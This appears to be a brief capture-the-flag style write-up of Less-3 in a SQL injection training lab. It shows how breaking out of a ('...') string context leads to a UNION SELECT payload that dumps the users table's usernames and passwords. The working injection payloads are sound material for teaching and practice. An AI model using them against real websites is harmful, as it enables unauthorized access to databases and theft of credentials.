Hello guys,

This is the write-up for Less-3 'GET - Error based - Single quotes with twist - string'.

So getting started,

using a single quote and comment after the numeric parameter for id
``` ?id = 1' -- -```,
an error is returned.
``` You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1 ```

so the input after id is not going into a simple ```... WHERE id = '<input>' ...;```

So trying out an alternate possibility where the input might be going into a ```... WHERE id = ('<input>')...;```

We can end the numeric paramenter after id with a ```')``` and then use UNION to execute another query which will help us.

Using ``` [URL]/?id=-1') UNION SELECT 1, group_concat(username,0x7c,password),3 FROM users -- - ```,

we get the login dump printed on the site.


